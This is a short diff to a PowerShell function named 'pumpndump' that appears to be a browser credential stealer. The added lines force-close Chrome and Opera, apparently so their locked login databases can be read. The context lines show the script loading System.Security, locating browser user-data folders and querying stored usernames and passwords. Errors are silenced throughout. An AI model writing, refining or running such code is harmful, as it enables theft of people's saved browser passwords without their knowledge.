@@ -6,7 +6,7 @@ function pumpndump
     $ErrorActionPreference = 'SilentlyContinue'
 # Google Chrome
     try {
-        
+        Stop-Process -Name "chrome"
         Add-Type -AssemblyName System.Security
 
         $chrome_path = $env:LOCALAPPDATA + "\Google\Chrome\User Data"
@@ -108,7 +108,7 @@ function pumpndump
 
 # Opera
     try {
-
+        Stop-Process -Name "opera"
         $opera_path = $env:APPDATA + "\Opera Software\Opera Stable"
         $query = "SELECT origin_url, username_value, password_value FROM logins WHERE blacklisted_by_user = 0"
 
